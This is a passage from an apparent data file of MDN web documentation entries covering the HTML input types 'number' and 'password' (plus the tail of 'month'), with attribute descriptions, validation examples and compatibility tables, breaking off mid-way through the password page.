[`stepDown()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepDown), [`stepUp()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepUp). |\n| **Implicit ARIA Role**          | [no corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The generic [`<input>`](../input) element and the interface used to manipulate it, [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)\n- [Date and time formats used in HTML](../../date_and_time_formats)\n- [Date and Time picker tutorial](https://developer.mozilla.org/en-US/docs/Learn/Forms/HTML5_input_types#date_and_time_pickers)\n- [`<input type=\"datetime-local\">`](datetime-local), [`<input type=\"date\">`](date), [`<input type=\"time\">`](time), and [`<input type=\"week\">`](week)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/month](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/month)"
- name: input type="number"
  summary: <input> elements of type number are used to let the user enter a number
  description: "# \\<input type=\"number\"\\>\n\n[`<input>`](../input) elements of type `number` are used to let the user enter a number. They include built-in validation to reject non-numerical entries.\n\nThe browser may opt to provide stepper arrows to let the user increase and decrease the value using their mouse or by tapping with a fingertip.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"number\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"tentacles\">Number of tentacles (10-100):</label>\n\n    <input type=\"number\" id=\"tentacles\" name=\"tentacles\" min=\"10\" max=\"100\" />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nOn browsers that don't support inputs of type `number`, a `number` input falls back to type `text`.\n\n## Value\n\nA number representing the value of the number entered into the input. You can set a default value for the input by including a number inside the [`value`](../input#value) attribute, like so:\n\nhtml\n\n```\n<input id=\"number\" type=\"number\" value=\"42\" />\n```\n\n## Additional attributes\n\nIn addition to the attributes commonly supported by all [`<input>`](../input) types, inputs of type `number` support these attributes.\n\n### `list`\n\nThe values of the list attribute is the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](../datalist) element located in the same document. The [`<datalist>`](../datalist) provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](../input#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\n### `max`\n\nThe maximum value to accept for this input. If the [`value`](../input#value) entered into the element exceeds this, the element fails [constraint validation](../../constraint_validation). If the value of the `max` attribute isn't a number, then the element has no maximum value.\n\nThis value must be greater than or equal to the value of the `min` attribute.\n\n### `min`\n\nThe minimum value to accept for this input. If the [`value`](../input#value) of the element is less than this, the element fails [constraint validation](../../constraint_validation). If a value is specified for `min` that isn't a valid number, the input has no minimum value.\n\nThis value must be less than or equal to the value of the `max` attribute.\n\n### `placeholder`\n\nThe `placeholder` attribute is a string that provides a brief hint to the user as to what kind of information is expected in the field. It should be a word or short phrase that demonstrates the expected type of data, rather than an explanatory message. The text *must not* include carriage returns or line feeds.\n\nIf the control's content has one directionality ([LTR](https://developer.mozilla.org/en-US/docs/Glossary/LTR) or [RTL](https://developer.mozilla.org/en-US/docs/Glossary/RTL)) but needs to present the placeholder in the opposite directionality, you can use Unicode bidirectional algorithm formatting characters to override directionality within the placeholder; see [How to use Unicode controls for bidi text](https://www.w3.org/International/questions/qa-bidi-unicode-controls) for more information.\n\n**Note:** Avoid using the `placeholder` attribute if you can. It is not as semantically useful as other ways to explain your form, and can cause unexpected technical issues with your content. See [`<input>` labels](../input#labels) for more information.\n\n### `readonly`\n\nA Boolean attribute which, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed by JavaScript code directly setting the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property.\n\n**Note:** Because a read-only field cannot have a value, `required` does not have any effect on inputs with the `readonly` attribute also specified.\n\n### `step`\n\nThe `step` attribute is a number that specifies the granularity that the value must adhere to, or the special value `any`, which is described below. Only values which are equal to the basis for stepping ([`min`](#min) if specified, [`value`](../input#value) otherwise, and an appropriate default value if neither of those is provided) are valid.\n\nA string value of `any` means that no stepping is implied, and any value is allowed (barring other constraints, such as [`min`](#min) and [`max`](#max)).\n\n**Note:** When the data entered by the user doesn't adhere to the stepping configuration, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) may round to the nearest valid value, preferring numbers in the positive direction when there are two equally close options.\n\nThe default stepping value for `number` inputs is `1`, allowing only integers to be entered—*unless* the stepping base is not an integer.\n\n## Using number inputs\n\nThe `number` input type should only be used for incremental numbers, especially when spinbutton incrementing and decrementing are helpful to user experience. The `number` input type is not appropriate for values that happen to only consist of numbers but aren't strictly speaking a number, such as postal codes in many countries or credit card numbers. For non-numeric inputs, consider using a different input type, such as [`<input type=\"tel\">`](tel) or other [`<input>`](../input) type with the [`inputmode`](../../global_attributes#inputmode) attribute:\n\nhtml\n\n```\n<input type=\"text\" inputmode=\"numeric\" pattern=\"\\d*\" />\n```\n\n`<input type=\"number\">` elements can help simplify your work when building the user interface and logic for entering numbers into a form. When you create a number input with the proper `type` value, `number`, you get automatic validation that the entered text is a number, and usually a set of up and down buttons to step the value up and down.\n\n**Warning:** Logically, you should not be able to enter characters inside a number input other than numbers. Some browsers allow invalid characters, others do not; see [Firefox bug 1398528](https://bugzil.la/1398528).\n\n**Note:** A user can tinker with your HTML behind the scenes, so your site *must not* use simple client-side validation for any security purposes. You *must* verify on the server side any transaction in which the provided value may have security implications of any kind.\n\nMobile browsers further help with the user experience by showing a special keyboard more suited for entering numbers when the user tries to enter a value.\n\n### A simple number input\n\nIn its most basic form, a number input can be implemented like this:\n\nhtml\n\n```\n<label for=\"ticketNum\">Number of tickets you would like to buy:</label>\n<input id=\"ticketNum\" type=\"number\" name=\"ticketNum\" value=\"0\" />\n```\n\nA number input is considered valid when empty and when a single number is entered, but is otherwise invalid. If the [`required`](../input#required) attribute is used, the input is no longer considered valid when empty.\n\n**Note:** Any number is an acceptable value, as long as it is a [valid floating point number](https://html.spec.whatwg.org/multipage/infrastructure.html#valid-floating-point-number) (that is, not [NaN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/NaN) or [Infinity](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Infinity)).\n\n### Placeholders\n\nSometimes it's helpful to offer an in-context hint as to what form the input data should take. This can be especially important if the page design doesn't offer descriptive labels for each [`<input>`](../input). This is where **placeholders** come in. A placeholder is a value most commonly used to provide a hint as to the format the input should take `value`. It is displayed inside the edit box when the element's `value` is `\"\"`. Once data is entered into the box, the placeholder disappears; if the box is emptied, the placeholder reappears.\n\nHere, we have an `number` input with the placeholder \"`Multiple of 10`\". Note how the placeholder disappears and reappears as you manipulate the contents of the edit field.\n\nhtml\n\n```\n<input type=\"number\" placeholder=\"Multiple of 10\" />\n```\n\n### Controlling step size\n\nBy default, the up and down buttons provided for you to step the number up and down will step the value up and down by 1. You can change this by providing a [`step`](../input#step) attribute, which takes as its value a number specifying the step amount. Our above example contains a placeholder saying that the value should be a multiple of 10, so it makes sense to add a `step` value of `10`:\n\nhtml\n\n```\n<input type=\"number\" placeholder=\"multiple of 10\" step=\"10\" />\n```\n\nIn this example, you should find that the up and down step arrows will increase and decrease the value by 10 each time, not 1. You can still manually enter a number that's not a multiple of 10, but it will be considered invalid.\n\n### Specifying minimum and maximum values\n\nYou can use the [`min`](../input#min) and [`max`](../input#max) attributes to specify a minimum and maximum value that the field can have. For example, let's give our example a minimum of `0`, and a maximum of `100`:\n\nhtml\n\n```\n<input type=\"number\" placeholder=\"multiple of 10\" step=\"10\" min=\"0\" max=\"100\" />\n```\n\nIn this updated version, you should find that the up and down step buttons will not allow you to go below 0 or above 100. You can still manually enter a number outside these bounds, but it will be considered invalid.\n\n### Allowing decimal values\n\nOne issue with number inputs is that their step size is 1 by default. If you try to enter a number with a decimal (such as \"1.0\"), it will be considered invalid. If you want to enter a value that requires decimals, you'll need to reflect this in the `step` value (e.g. `step=\"0.01\"` to allow decimals to two decimal places). Here's a simple example:\n\nhtml\n\n```\n<input type=\"number\" placeholder=\"1.0\" step=\"0.01\" min=\"0\" max=\"10\" />\n```\n\nSee that this example allows any value between `0.0` and `10.0`, with decimals to two places. For example, \"9.52\" is valid, but \"9.521\" is not.\n\nIf you want to allow arbitrary decimal values, you can set the `step` value to `\"any\"`.\n\n### Controlling input size\n\n[`<input>`](../input) elements of type `number` don't support form sizing attributes such as [`size`](../input#size). You'll have to resort to [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) to change the size of these controls.\n\nFor example, to adjust the width of the input to be only as wide as is needed to enter a three-digit number, we can change our HTML to include an [`id`](../../global_attributes#id) and to shorten our placeholder since the field will be too narrow for the text we have been using so far:\n\nhtml\n\n```\n<input\n  type=\"number\"\n  placeholder=\"x10\"\n  step=\"10\"\n  min=\"0\"\n  max=\"100\"\n  id=\"number\" />\n```\n\nThen we add some CSS to narrow the width of the element with the `id` selector `#number`:\n\ncss\n\n```\n#number {\n  width: 3em;\n}\n```\n\nThe result looks like this:\n\n### Offering suggested values\n\nYou can provide a list of default options from which the user can select by specifying the [`list`](../input#list) attribute, which contains as its value the [`id`](../../global_attributes#id) of a [`<datalist>`](../datalist), which in turn contains one [`<option>`](../option) element per suggested value. Each `option`'s `value` is the corresponding suggested value for the number entry box.\n\nhtml\n\n```\n<input id=\"ticketNum\" type=\"number\" name=\"ticketNum\" list=\"defaultNumbers\" />\n<span class=\"validity\"></span>\n\n<datalist id=\"defaultNumbers\">\n  <option value=\"10045678\"></option>\n  <option value=\"103421\"></option>\n  <option value=\"11111111\"></option>\n  <option value=\"12345678\"></option>\n  <option value=\"12999922\"></option>\n</datalist>\n```\n\n## Validation\n\nWe have already mentioned a number of validation features of `number` inputs, but let's review them now:\n\n- `<input type=\"number\">` elements automatically invalidate any entry that isn't a number (or empty, unless `required` is specified).\n- You can use the [`required`](../input#required) attribute to make an empty entry invalid. (In other words, the input *must* be filled in.)\n- You can use the [`step`](../input#step) attribute to constrain valid values to a certain set of steps (e.g., multiples of 10).\n- You can use the [`min`](../input#min) and [`max`](../input#max) attributes to constrain valid values to lower and upper bounds.\n\nThe following example exhibits all of the above features, as well as using some CSS to display valid and invalid icons, depending on the `input`'s value:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"balloons\">Number of balloons to order (multiples of 10):</label>\n    <input\n      id=\"balloons\"\n      type=\"number\"\n      name=\"balloons\"\n      step=\"10\"\n      min=\"0\"\n      max=\"100\"\n      required />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <input type=\"submit\" />\n  </div>\n</form>\n```\n\nTry submitting the form with different invalid values entered — e.g., no value; a value below 0 or above 100; a value that is not a multiple of 10; or a non-numerical value — and see how the error messages the browser gives you differ with different ones.\n\nThe CSS applied to this example is as follows:\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n}\n\ninput:invalid + span::after {\n  content: \"✖\";\n  padding-left: 5px;\n}\n\ninput:valid + span::after {\n  content: \"✓\";\n  padding-left: 5px;\n}\n```\n\nHere we use the [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) and [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) pseudo classes to display an appropriate invalid or valid icon as generated content on the adjacent [`<span>`](../span) element, as a visual indicator of validity.\n\nWe put it on a separate `<span>` element for added flexibility. Some browsers don't display generated content very effectively on some types of form inputs. (Read, for example, the section on [`<input type=\"date\">` validation](date#validation).)\n\n**Warning:** HTML form validation is *not* a substitute for server-side scripts that ensure that the entered data is in the proper format!\n\nIt's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it entirely. It's also possible for someone to bypass your HTML and submit the data directly to your server.\n\nIf your server-side code fails to validate the data it receives, disaster could strike when improperly-formatted data is submitted (or data which is too large, is of the wrong type, and so forth).\n\n### Pattern validation\n\n`<input type=\"number\">` elements do not support use of the [`pattern`](../input#pattern) attribute for making entered values conform to a specific regex pattern.\n\nThe rationale for this is that number inputs won't be valid if they contain anything except numbers, and you can constrain the minimum and maximum number of valid digits using the [`min`](../input#min) and [`max`](../input#max) attributes (as explained above).\n\n## Accessibility\n\nThe implicit [role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles) for the `<input type=\"number\">` element is [`spinbutton`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/spinbutton_role). If spinbutton is not an important feature for your form control, consider *not* using `type=\"number\"`. Instead, use [`inputmode=\"numeric\"`](../../global_attributes/inputmode) along with a [`pattern`](../../attributes/pattern) attribute that limits the characters to numbers and associated characters. With `<input type=\"number\">`, there is a risk of users accidentally incrementing a number when they're trying to do something else. Additionally, if users try to enter something that's not a number, there's no explicit feedback about what they're doing wrong.\n\nAlso consider using the [`autocomplete`](../../attributes/autocomplete) attribute to help users complete forms more quickly and with fewer chances of errors. For example, to enable autofill on a zip code field, set `autocomplete=\"postal-code\"`.\n\n## Examples\n\nWe've already covered the fact that by default, the increment is `1`, and you can use the [`step`](../input#step) attribute to allow decimal inputs. Let's take a closer look.\n\nIn the following example is a form for entering the user's height. It defaults to accepting a height in meters, but you can click the relevant button to change the form to accept feet and inches instead. The input for the height in meters accepts decimals to two places.\n\nThe HTML looks like this:\n\nhtml\n\n```\n<form>\n  <div class=\"metersInputGroup\">\n    <label for=\"meters\">Enter your height — meters:</label>\n    <input\n      id=\"meters\"\n      type=\"number\"\n      name=\"meters\"\n      step=\"0.01\"\n      min=\"0\"\n      placeholder=\"e.g. 1.78\"\n      required />\n    <span class=\"validity\"></span>\n  </div>\n  <div class=\"feetInputGroup\" style=\"display: none;\">\n    <span>Enter your height — </span>\n    <label for=\"feet\">feet:</label>\n    <input id=\"feet\" type=\"number\" name=\"feet\" min=\"0\" step=\"1\" />\n    <span class=\"validity\"></span>\n    <label for=\"inches\">inches:</label>\n    <input id=\"inches\" type=\"number\" name=\"inches\" min=\"0\" max=\"11\" step=\"1\" />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <input\n      type=\"button\"\n      class=\"meters\"\n      value=\"Enter height in feet and inches\" />\n  </div>\n  <div>\n    <input type=\"submit\" value=\"Submit form\" />\n  </div>\n</form>\n```\n\nYou'll see that we are using many of the attributes we've already looked at in the article earlier on. Since we want to accept a meter value in centimeters, we've set the `step` value to `0.01`, so that values like *1.78* are not seen as invalid. We've also provided a placeholder for that input.\n\nWe've hidden the feet and inches inputs initially using `style=\"display: none;\"`, so that meters is the default entry type.\n\nNow, onto the CSS. This looks very similar to the validation styling we saw before; nothing remarkable here.\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n  position: relative;\n}\n\ninput[type=\"number\"] {\n  width: 100px;\n}\n\ninput + span {\n  padding-right: 30px;\n}\n\ninput:invalid + span::after {\n  position: absolute;\n  content: \"✖\";\n  padding-left: 5px;\n}\n\ninput:valid + span::after {\n  position: absolute;\n  content: \"✓\";\n  padding-left: 5px;\n}\n```\n\nAnd finally, the JavaScript:\n\njs\n\n```\nconst metersInputGroup = document.querySelector(\".metersInputGroup\");\nconst feetInputGroup = document.querySelector(\".feetInputGroup\");\nconst metersInput = document.querySelector(\"#meters\");\nconst feetInput = document.querySelector(\"#feet\");\nconst inchesInput = document.querySelector(\"#inches\");\nconst switchBtn = document.querySelector('input[type=\"button\"]');\n\nswitchBtn.addEventListener(\"click\", () => {\n  if (switchBtn.getAttribute(\"class\") === \"meters\") {\n    switchBtn.setAttribute(\"class\", \"feet\");\n    switchBtn.value = \"Enter height in meters\";\n\n    metersInputGroup.style.display = \"none\";\n    feetInputGroup.style.display = \"block\";\n\n    feetInput.setAttribute(\"required\", \"\");\n    inchesInput.setAttribute(\"required\", \"\");\n    metersInput.removeAttribute(\"required\");\n\n    metersInput.value = \"\";\n  } else {\n    switchBtn.setAttribute(\"class\", \"meters\");\n    switchBtn.value = \"Enter height in feet and inches\";\n\n    metersInputGroup.style.display = \"block\";\n    feetInputGroup.style.display = \"none\";\n\n    feetInput.removeAttribute(\"required\");\n    inchesInput.removeAttribute(\"required\");\n    metersInput.setAttribute(\"required\", \"\");\n\n    feetInput.value = \"\";\n    inchesInput.value = \"\";\n  }\n});\n```\n\nAfter declaring a few variables, an event listener is added to the `button` to control the switching mechanism. This is pretty simple, mostly involving changing over the button's `class` and [`<label>`](../label), and updating the display values of the two sets of inputs when the button is pressed.\n\n(Note that we're not converting back and forth between meters and feet/inches here, which a real-life web application would probably do.)\n\n**Note:** When the user clicks the button, the `required` attribute(s) are removed from the input(s) we are hiding, and empty the `value` attribute(s). This is so the form can be submitted if both input sets aren't filled in. It also ensures that the form won't submit data that the user didn't mean to.\n\nIf you didn't do this, you'd have to fill in both feet/inches **and** meters to submit the form!\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                            |\n|---------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A [`Number`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number) representing a number, or empty                                                                                                                                      |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                  |\n| **Supported common attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`placeholder`](../input#placeholder), [`readonly`](../input#readonly)                                                                                                                                   |\n| **IDL attributes**              | [`list`](../input#list), [`value`](../input#value), `valueAsNumber`                                                                                                                                                                                                        |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                    |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`stepUp()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepUp), [`stepDown()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepDown) |\n| **Implicit ARIA Role**          | [`spinbutton`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/spinbutton_role)                                                                                                                                                                      |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `number` | 7       | 12   | 29      | 15    | 5.1    | 18             | 29                  | 14            | 5             | 1.0              | 4.4             |     |\n\n## See also\n\n- [HTML forms guide](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- [`<input>`](../input)\n- [`<input type=\"tel\">`](tel)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n- [Article: Why Gov.UK changed the input type for numbers](https://technology.blog.gov.uk/2020/02/24/why-the-gov-uk-design-system-team-changed-the-input-type-for-numbers/)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/number](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/number)"
- name: input type="password"
  summary: <input> elements of type password provide a way for the user to securely enter a password
  description: "# \\<input type=\"password\"\\>\n\n`<input>` elements of type `password` provide a way for the user to securely enter a password.\n\nThe element is presented as a one-line plain text editor control in which the text is obscured so that it cannot be read, usually by replacing each character with a symbol such as the asterisk (\"\\*\") or a dot (\"•\"). This character will vary depending on the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) and operating system.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"password\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <div>\n      <label for=\"username\">Username:</label>\n      <input type=\"text\" id=\"username\" name=\"username\" />\n    </div>\n\n    <div>\n      <label for=\"pass\">Password (8 characters minimum):</label>\n      <input type=\"password\" id=\"pass\" name=\"password\" minlength=\"8\" required />\n    </div>\n\n    <input type=\"submit\" value=\"Sign in\" />\n\n    label {\n      display: block;\n    }\n\n    input[type='submit'],\n    label {\n      margin-top: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe precise behavior of the entry process may vary from browser to browser. Some browsers display the typed character for a moment before obscuring it, while others allow the user to toggle the display of plain-text on and off. Both approaches help a user check that they entered the intended password, which can be particularly difficult on mobile devices.\n\n**Note:** Any forms involving sensitive information like passwords (such as login forms) should be served over HTTPS. Many browsers now implement mechanisms to warn against insecure login forms; see [Insecure passwords](https://developer.mozilla.org/en-US/docs/Web/Security/Insecure_passwords).\n\n## Value\n\nThe [`value`](../input#value) attribute contains a string whose value is the current contents of the text editing control being used to enter the password. If the user hasn't entered anything yet, this value is an empty string (`\"\"`). If the [`required`](../input#required) property is specified, then the password edit box must contain a value other than an empty string to be valid.\n\nIf the [`pattern`](../input#pattern) attribute is specified, the content of a `password` control is only considered valid if the value passes validation; see [Validation](#validation) for more information.\n\n**Note:** The line feed (U+000A) and carriage return (U+000D) characters are not permitted in a `password` value. When setting the value of a password control, line feed and carriage return characters are stripped out of the value.\n\n## Additional attributes\n\nIn addition to the attributes that operate on all [`<input>`](../input) elements regardless of their type, password field inputs support the following attributes.\n\n### maxlength\n\nThe maximum string length (measured in UTF-16 code units) that the user can enter into the password field. This must be an integer value of 0 or higher. If no `maxlength` is specified, or an invalid value is specified, the password field has no maximum length. This value must also be greater than or equal to the value of `minlength`.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text entered into the field is greater than `maxlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### minlength\n\nThe minimum string length (measured in UTF-16 code units) that the user can enter into the password entry field. This must be a non-negative integer value smaller than or equal to the value specified by `maxlength`. If no `minlength` is specified, or an invalid value is specified, the password input has no minimum length.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text entered into the field is fewer than `minlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### pattern\n\nThe `pattern` attribute, when specified, is a regular expression that the input's [`value`](../input#value) must match for the value to pass [constraint validation](../../constraint_validation). It must be a valid JavaScript regular expression, as used by the [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) type, and as documented in our [guide on regular expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions); the `'u'` flag is specified when compiling the regular expression, so that the pattern is treated as a sequence of Unicode code points, instead of as [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII). No forward slashes should be specified around the pattern text.\n\nIf the specified pattern is not specified or is invalid, no regular expression is applied and this attribute is ignored completely.\n\n**Note:** Use the [`title`](../input#title) attribute to specify text that most browsers will display as a tooltip to explain what the requirements are to match the pattern. You should also include other explanatory text nearby.\n\nUse of a pattern is strongly recommended for password inputs, in order to help ensure that valid passwords using a wide assortment of character classes are selected and used by your users. With a pattern, you can mandate case rules, require the use of some number of digits and/or punctuation characters, and so forth. See the section [Validation](#validation) for details and an example.\n\n### placeholder\n\nThe `placeholder` attribute is a string that provides a brief hint to the user as to what kind of information is expected in the field. It should be a word or short phrase that demonstrates the expected type of data, rather than an explanatory message. The text *must not* include carriage returns or line feeds.\n\nIf the control's content has one directionality ([LTR](https://developer.mozilla.org/en-US/docs/Glossary/LTR) or [RTL](https://developer.mozilla.org/en-US/docs/Glossary/RTL)) but needs to present the placeholder in the opposite directionality, you can use Unicode bidirectional algorithm formatting characters to override directionality within the placeholder; see [How to use Unicode controls for bidi text](https://www.w3.org/International/questions/qa-bidi-unicode-controls) for more information.\n\n**Note:** Avoid using the `placeholder` attribute if you can. It is not as semantically useful as other ways to explain your form, and can cause unexpected technical issues with your content. See [`<input>` labels](../input#labels) for more information.\n\n### readonly\n\nA Boolean attribute which, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed from JavaScript code that directly sets the value of the [`HTMLInputElement.value`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) property.\n\n**Note:** Because a read-only field cannot have a value, `required` does not have any effect on inputs with the `readonly` attribute also specified.\n\n### size\n\nThe `size` attribute is a numeric value indicating how many characters wide the input field should be. The value must be a number greater than zero, and the default value is 20. Since character widths vary, this may or may not be exact and should not be relied upon to be so; the resulting input may be narrower or wider than the specified number of characters, depending on the characters and the font ([`font`](https://developer.mozilla.org/en-US/docs/Web/CSS/font) settings in use).\n\nThis does *not* set a limit on how many characters the user can enter into the field. It only specifies approximately how many can be seen at a time. To set an upper limit on the length of the input data, use the [`maxlength`](#maxlength) attribute.\n\n## Using password inputs\n\nPassword input boxes generally work just like other textual input boxes; the main difference is the obscuring of the content to prevent people near the user from reading the password.\n\n### A simple password input\n\nHere we see the most basic password input, with a label established using the [`<label>`](../label) element.\n\nhtml\n\n```\n<label for=\"userPassword\">Password: </label>\n<input id=\"userPassword\" type=\"password\" />\n```\n\n### Allowing autocomplete\n\nTo allow the user's password manager to automatically enter the password, specify the [`autocomplete`](../input#autocomplete) attribute. For passwords, this should typically be one of the following:\n\n[`on`](#on)  \nAllow the browser or a password manager to automatically fill out the password field. This isn't as informative as using either `current-password` or `new-password`.\n\n[`off`](#off)  \nDon't allow the browser or password manager to automatically fill out the password field. Note that some software ignores this value, since it's typically harmful to users' ability to maintain safe password practices.\n\n[`current-password`](#current-password)  \nAllow the browser or password manager to enter the current password for the site. This provides more information than `on` does, since it lets the browser or password manager automatically enter currently-known password for the site in the field, but not to suggest a new one.\n\n[`new-password`](#new-password)  \nAllow the browser or password manager to automatically enter a new password for the site; this is used on \"change your password\" and \"new user\" forms, on the field asking the user for a new password. The new password may be generated in a variety of ways, depending on the password manager in use. It may fill in a new suggested password, or it might show the user an interface for creating one.\n\nhtml\n\n```\n<label for=\"userPassword\">Password:</label>\n<input id=\"userPassword\" type=\"password\" autocomplete=\"current-password\" />\n```\n\n### Making the password mandatory\n\nTo tell the user's browser that the password field must have a valid value before the form can be submitted, specify the Boolean [`required`](../input#required) attribute.\n\nhtml\n\n```\n<label for=\"userPassword\">Password: </label>\n<input id=\"userPassword\" type=\"password\" required />\n<input type=\"submit\" value=\"Submit\" />\n```\n\n### Specifying an input mode\n\nIf your recommended (or required) password syntax rules would benefit from an alternate text entry interface than the standard keyboard, you can use the [`inputmode`](../input#inputmode) attribute to request a specific one. The most obvious use case for this is if the password is required to be numeric (such as a PIN). Mobile devices with virtual keyboards, for example, may opt to switch to a numeric keypad layout instead of a full keyboard, to make entering the password easier. If the PIN is for one-time use, set the [`autocomplete`](../input#autocomplete) attribute to either `off` or `one-time-code` to suggest that it's not saved.\n\nhtml\n\n```\n<label for=\"pin\">PIN: </label>\n<input id=\"pin\" type=\"password\" inputmode=\"numeric\" />\n```\n\n### Setting length requirements\n\nAs usual, you can use the [`minlength`](../input#minlength) and [`maxlength`](../input#maxlength) attributes to establish minimum and maximum acceptable lengths for the password. This example expands on the previous one by specifying that the user's PIN must be at least four and no more than eight digits. The [`size`](../input#size) attribute is used to ensure that the password entry control is eight characters wide.\n\nhtml\n\n```\n<label for=\"pin\">PIN:</label>\n<input\n  id=\"pin\"\n  type=\"password\"\n  inputmode=\"numeric\"\n  minlength=\"4\"\n  maxlength=\"8\"\n  size=\"8\" />\n```\n\n### Selecting text\n\nAs with other textual entry controls, you can use the [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select) method to select all the text in the password field.\n\n#### HTML\n\nhtml\n\n```\n<label for=\"userPassword\">Password: </label>\n<input id=\"userPassword\" type=\"password\" size=\"12\" />\n<button id=\"selectAll\">Select All</button>\n```\n\n#### JavaScript\n\njs\n\n```\ndocument.getElementById(\"selectAll\").onclick = () => {\n  document.getElementById(\"userPassword\").select();\n};\n```\n\n#### Result\n\nYou can also use [`selectionStart`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/selectionStart) and [`selectionEnd`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/selectionEnd) to get (or set) what range of characters in the control are currently selected, and [`selectionDirection`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/selectionDirection) to know which direction selection occurred in (or will be extended in, depending on your platform; see its documentation for an explanation). However, given that the text is obscured, the usefulness of these is somewhat limited.\n\n## Validation\n\nIf your application has character set restrictions or any other requirement for the actual content of the entered password, you can use the [`pattern`](../input#pattern) attribute to establish a regular expression to be used to automatically ensure that your passwords meet those requirements.\n\nIn this example, only values consisting of at least four and no more than eight hexadecimal digits are valid.\n\nhtml\n\n```\n<label for=\"hexId\">Hex ID: </label>\n<input\n  id=\"hexId\"\n  type=\"password\"\n  pattern=\"[0-9a-fA-F]{4,8}\"\n  title=\"Enter an ID consisting of 4-8 hexadecimal digits\"\n  autocomplete=\"new-password\" />\n```\n\n## Examples\n\n### Requesting a Social Security 